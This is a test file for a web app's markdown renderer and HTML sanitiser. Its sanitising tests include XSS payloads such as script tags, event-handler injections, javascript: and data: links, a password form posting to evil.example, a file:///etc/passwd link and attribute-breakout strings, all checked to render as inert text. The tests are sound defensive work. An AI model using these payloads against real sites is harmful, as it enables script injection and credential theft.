// @vitest-environment jsdom
// lib/markdown.ts: rendering and sanitising. Run: make test (or npm test in web/)
import assert from "node:assert/strict";
import { test } from "vitest";
import { markdown, markdownInline } from "../src/lib/markdown";

// Parse into a DOM so checks see what a browser would
function page(html: string): HTMLElement {
  const box = document.createElement("div");
  box.innerHTML = html;
  return box;
}

// ── Rendering ───────────────────────────────────────────────────

test("headings, emphasis, code and lists come out as HTML", () => {
  const box = page(markdown("# Done\n\nMade **two** _small_ changes in `panel.ts`:\n\n- one\n- two\n\n1. first\n2. second"));
  assert.equal(box.querySelector("h1")?.textContent, "Done");
  assert.equal(box.querySelector("strong")?.textContent, "two");
  assert.equal(box.querySelector("em")?.textContent, "small");
  assert.equal(box.querySelector("code")?.textContent, "panel.ts");
  assert.equal(box.querySelectorAll("ul > li").length, 2);
  assert.equal(box.querySelectorAll("ol > li").length, 2);
});

test("task lists keep their tick boxes, which can't be changed", () => {
  const boxes = [...page(markdown("- [ ] open\n- [x] done")).querySelectorAll("input")];
  assert.deepEqual(boxes.map((b) => [b.type, b.checked, b.disabled]), [["checkbox", false, true], ["checkbox", true, true]]);
});

test("code blocks keep their text as text", () => {
  const pre = page(markdown("```html\n<b>if (a < b)</b>\n```")).querySelector("pre code");
  assert.equal(pre?.textContent, "<b>if (a < b)</b>\n");
  assert.equal(pre?.children.length, 0);
});

test("tables keep their columns and alignment", () => {
  const box = page(markdown("| File | Lines |\n|:--|--:|\n| a.ts | 12 |"));
  assert.deepEqual([...box.querySelectorAll("th")].map((c) => c.textContent), ["File", "Lines"]);
  assert.equal(box.querySelectorAll("td")[1]?.getAttribute("align"), "right");
});

test("single line breaks are kept, for text written one point per line", () => {
  assert.equal(page(markdown("Works at Acme Corp\nLikes short answers")).querySelectorAll("p br").length, 1);
});

test("links open in a new tab and don't pass on where they came from", () => {
  const a = page(markdown("See [the PR](https://github.com/x/y/pull/1).")).querySelector("a")!;
  assert.equal(a.getAttribute("href"), "https://github.com/x/y/pull/1");
  assert.equal(a.getAttribute("target"), "_blank");
  assert.equal(a.getAttribute("rel"), "noopener noreferrer nofollow");
});

test("inline rendering does emphasis, code and links but no blocks", () => {
  const html = markdownInline("Prefers **short** answers, see `memory.md` or [docs](https://example.com)\n# not a heading");
  const box = page(html);
  assert.equal(box.querySelector("strong")?.textContent, "short");
  assert.equal(box.querySelector("code")?.textContent, "memory.md");
  assert.ok(box.querySelector("a[target=_blank]"));
  assert.equal(box.querySelector("p, h1, ul"), null);
});

test("without links, for a line inside a task's card, a link's text stays as text", () => {
  const box = page(markdownInline("Asks about **the** [PR](https://github.com/x/y/pull/1)", false));
  assert.equal(box.querySelector("a"), null);
  assert.equal(box.querySelector("strong")?.textContent, "the");
  assert.equal(box.textContent, "Asks about the PR");
});

// ── Sanitising ──────────────────────────────────────────────────

const HOSTILE = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<iframe src=https://evil.example></iframe>",
  "<a href=\"javascript:alert(1)\">click</a>",
  "<svg onload=alert(1)></svg>",
  "<style>body{display:none}</style>",
  "<form action=https://evil.example><input name=pass></form>",
  "<div onclick=alert(1) style=\"position:fixed\">x</div>",
];

test("raw HTML in the text is shown as text, never run or parsed", () => {
  for (const raw of HOSTILE) {
    for (const html of [markdown(`Hi\n\n${raw}\n\nthere`), markdown(`Hi ${raw} there`), markdownInline(`Hi ${raw} there`)]) {
      const box = page(html);
      assert.equal(box.querySelector("script, img, iframe, svg, style, form, div, input"), null, html);
      assert.ok(!box.querySelector("a[href]"), html);
      assert.ok(![...box.querySelectorAll("*")].some((el) => [...el.attributes].some((a) => a.name.startsWith("on") || a.name === "style")), html);
      assert.ok(box.textContent!.includes(raw.slice(0, 7)), `${raw} should show as text: ${html}`);
    }
  }
});

test("links only go out over the web or to mail", () => {
  const hrefs = (md: string) => [...page(markdown(md)).querySelectorAll("a")].map((a) => a.getAttribute("href"));
  assert.deepEqual(hrefs("[a](javascript:alert(1)) [b](JaVaScRiPt:alert(1)) [c](data:text/html,<script>alert(1)</script>)"), [null, null, null]);
  assert.deepEqual(hrefs("[d](vbscript:x) [e](/api/token) [f](file:///etc/passwd) [g](java%0ascript:alert(1))"), [null, null, null, null]);
  assert.deepEqual(hrefs("[h](https://a.example) [i](http://b.example) [j](mailto:me@example.com) <https://c.example>"),
    ["https://a.example", "http://b.example", "mailto:me@example.com", "https://c.example"]);
});

test("images become links, so nothing loads from elsewhere just by being shown", () => {
  const box = page(markdown("![tracking pixel](https://evil.example/pixel.gif?id=user42)"));
  assert.equal(box.querySelector("img"), null);
  const a = box.querySelector("a")!;
  assert.equal(a.getAttribute("href"), "https://evil.example/pixel.gif?id=user42");
  assert.equal(a.textContent, "tracking pixel");
  assert.equal(page(markdown("![x](javascript:alert(1))")).querySelector("a[href]"), null);
});

test("link titles and text can't break out of their attribute", () => {
  const box = page(markdown('[x](https://a.example "t\\" onmouseover=\\"alert(1)") ![y" onerror="alert(1)](https://b.example)'));
  assert.ok(![...box.querySelectorAll("*")].some((el) => [...el.attributes].some((a) => a.name.startsWith("on"))), box.innerHTML);
});
